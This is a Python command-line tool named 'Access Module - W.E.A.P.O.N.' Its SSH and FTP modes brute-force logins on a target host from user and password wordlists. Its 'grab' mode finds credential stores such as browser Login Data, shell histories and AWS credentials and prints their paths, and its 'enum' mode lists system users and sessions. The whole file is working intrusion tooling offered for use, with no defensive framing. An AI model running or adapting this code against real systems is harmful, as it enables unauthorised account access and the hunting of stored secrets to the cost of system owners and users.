import argparse
import os
import subprocess
import paramiko
from ftplib import FTP
import getpass

# -----------------------------
# SSH Brute Forcer
# -----------------------------
def ssh_bruteforce(host, userlist, passlist):
    print(f"[*] Starting SSH brute force on {host}")
    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()

    for user in usernames:
        for password in passwords:
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(host, username=user, password=password, timeout=2)
                print(f"[+] SSH Login found: {user}:{password}")
                ssh.close()
                return
            except:
                continue
    print("[!] No valid SSH credentials found.")

# -----------------------------
# FTP Brute Forcer
# -----------------------------
def ftp_bruteforce(host, userlist, passlist):
    print(f"[*] Starting FTP brute force on {host}")
    usernames = open(userlist).read().splitlines()
    passwords = open(passlist).read().splitlines()

    for user in usernames:
        for password in passwords:
            try:
                ftp = FTP(host, timeout=2)
                ftp.login(user, password)
                print(f"[+] FTP Login found: {user}:{password}")
                ftp.quit()
                return
            except:
                continue
    print("[!] No valid FTP credentials found.")

# -----------------------------
# Token/Password File Grabber
# -----------------------------
def grab_tokens():
    print("[*] Searching for tokens/credentials in common locations...\n")
    home = os.path.expanduser("~")
    locations = [
        ".bash_history", ".zsh_history", ".config/Code/User/settings.json",
        ".config/google-chrome/Default/Login Data",
        ".mozilla/firefox/profiles.ini", ".aws/credentials"
    ]
    for loc in locations:
        path = os.path.join(home, loc)
        if os.path.exists(path):
            print(f"[+] Found: {path}")
        else:
            continue

# -----------------------------
# Session/User Enumerator
# -----------------------------
def enum_users():
    print("[*] Current system users/sessions:\n")
    try:
        subprocess.run(["who"], check=True)
        print("\n[*] Active login sessions:\n")
        subprocess.run(["w"], check=True)
    except Exception as e:
        print(f"[!] Enumeration failed: {e}")

# -----------------------------
# Main CLI Logic
# -----------------------------
def main():
    parser = argparse.ArgumentParser(description="Access Module - W.E.A.P.O.N.")
    sub = parser.add_subparsers(dest="mode")

    ssh = sub.add_parser("ssh", help="SSH brute force")
    ssh.add_argument("host")
    ssh.add_argument("users")
    ssh.add_argument("passwords")

    ftp = sub.add_parser("ftp", help="FTP brute force")
    ftp.add_argument("host")
    ftp.add_argument("users")
    ftp.add_argument("passwords")

    sub.add_parser("grab", help="Grab known token/credential files")
    sub.add_parser("enum", help="Enumerate users/sessions")

    args = parser.parse_args()

    if args.mode == "ssh":
        ssh_bruteforce(args.host, args.users, args.passwords)
    elif args.mode == "ftp":
        ftp_bruteforce(args.host, args.users, args.passwords)
    elif args.mode == "grab":
        grab_tokens()
    elif args.mode == "enum":
        enum_users()
    else:
        parser.print_help()

if __name__ == "__main__":
    main()

